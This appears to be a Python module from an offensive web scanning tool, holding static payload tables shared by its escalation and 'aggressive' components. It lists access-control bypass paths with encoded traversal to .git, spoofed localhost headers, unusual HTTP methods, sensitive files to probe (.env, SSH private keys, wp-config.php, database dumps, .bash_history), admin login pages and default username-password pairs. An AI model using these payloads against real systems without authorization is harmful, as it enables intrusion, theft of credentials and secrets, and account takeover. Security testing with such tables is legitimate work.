"""Static payload tables shared by escalation.py and aggressive.py.

Kept in a separate module to avoid circular imports between the two.
"""
from __future__ import annotations

EXTREME_PATH_BYPASS = [
    "{p}", "/{p}", "//{p}", "///{p}", "/./{p}", "/.//{p}",
    "/{p}/", "/{p}//", "/{p}/.", "/{p}/..",
    "/{p};", "/{p};.css", "/{p};.js", "/{p};swagger-ui",
    "/{p}?", "/{p}?id=1", "/{p}?.css", "/{p}#",
    "/{p}.json", "/{p}.xml", "/{p}.txt", "/{p}.php",
    "/{p}%00", "/{p}%20", "/{p}%09", "/{p}%23",
    "/%2e/{p}", "/%2e%2e/{p}", "/{p}/..;/",
    "/%2egit/{x}", "/%2e%67%69%74/{x}",
    "/.%67it/{x}", "/.GiT/{x}", "/.GIT/{x}",
    "/{p}/%2e", "/{p}/%2e%2e",
    "//{prefix}//.git/{x}", "/.git/%2e/{x}",
    "/.git%2F{x}", "/.git/%2F{x}",
    "/login.php/../.git/{x}", "/login.php/..%2F.git/{x}",
    "/images/../.git/{x}", "/api/../.git/{x}",
]

EXTREME_HEADER_BYPASS = [
    {"X-Original-URL": "/{p}"},
    {"X-Rewrite-URL": "/{p}"},
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Forwarded-Host": "localhost"},
    {"X-Real-IP": "127.0.0.1"},
    {"X-Remote-IP": "127.0.0.1"},
    {"X-Custom-IP-Authorization": "127.0.0.1"},
    {"X-Originating-IP": "127.0.0.1"},
    {"X-Forwarded-Proto": "http"},
    {"X-Forwarded-Scheme": "http"},
    {"X-Host": "127.0.0.1"},
    {"Forwarded": "for=127.0.0.1;host=localhost;proto=http"},
    {"Referer": "/{p}"},
    {"Referer": "https://www.google.com/"},
    {"X-HTTP-Method-Override": "GET"},
    {"X-Method-Override": "GET"},
    {"X-Forwarded-Path": "/{p}"},
    {"X-Originally-Forwarded-For": "127.0.0.1"},
    {"X-WAF-Bypass": "1"},
]

EXTREME_METHODS = ["GET", "HEAD", "POST", "OPTIONS", "TRACE", "PROPFIND",
                   "MKCOL", "MOVE", "COPY", "LOCK", "DEBUG"]

HIDDEN_PATHS = [
    ".env", ".env.local", ".env.production", ".env.dev", ".env.staging",
    ".env.backup", ".env.old",
    "config.php.bak", "config.php~", "config.php.swp", "config.php.orig",
    "config.json", "config.yml", "config.yaml", "settings.json",
    "composer.json", "composer.lock", "package.json", "package-lock.json",
    "yarn.lock", "Gemfile", "Gemfile.lock", "requirements.txt", "Pipfile",
    "backup.sql", "backup.zip", "backup.tar.gz", "db.sql", "dump.sql",
    "database.sql", "site.zip", "www.zip", "html.zip", "backup.tar",
    ".svn/entries", ".svn/wc.db", ".hg/store/data", ".bzr/branch/branch.conf",
    ".DS_Store", "robots.txt", "sitemap.xml", "humans.txt", "crossdomain.xml",
    "web.config", ".htaccess", ".htpasswd", "phpinfo.php", "info.php",
    "test.php", "debug.php", "admin.php", "shell.php",
    "wp-config.php", "wp-config.php.bak", "wp-config.bak",
    "id_rsa", "id_dsa", "id_ed25519", ".ssh/id_rsa", ".ssh/authorized_keys",
    ".bash_history", ".bash_logout", ".bashrc", ".profile",
    "Dockerfile", "docker-compose.yml", "docker-compose.yaml",
    "Jenkinsfile", ".circleci/config.yml", ".gitlab-ci.yml",
    ".github/workflows/main.yml", ".travis.yml",
    "swagger.json", "swagger.yaml", "openapi.json", "openapi.yaml",
    "graphql", "api-docs", "v1/api-docs", "actuator", "metrics",
    "server-status", "server-info", ".well-known/security.txt",
    "phpmyadmin/", "adminer.php", "pma/",
]

LOGIN_PAGES = [
    "/login", "/login.php", "/login.html", "/signin", "/admin",
    "/admin/login", "/admin.php", "/administrator", "/wp-admin",
    "/wp-login.php", "/user/login", "/account/login",
    "/api/login", "/api/auth/login", "/api/v1/login", "/api/v2/login",
    "/auth", "/oauth/authorize",
]

DEFAULT_CREDS = [
    ("admin", "admin"),
    ("admin", "password"),
    ("admin", "admin123"),
    ("administrator", "administrator"),
    ("administrator", "password"),
    ("root", "root"),
    ("root", "toor"),
    ("test", "test"),
    ("demo", "demo"),
    ("guest", "guest"),
]
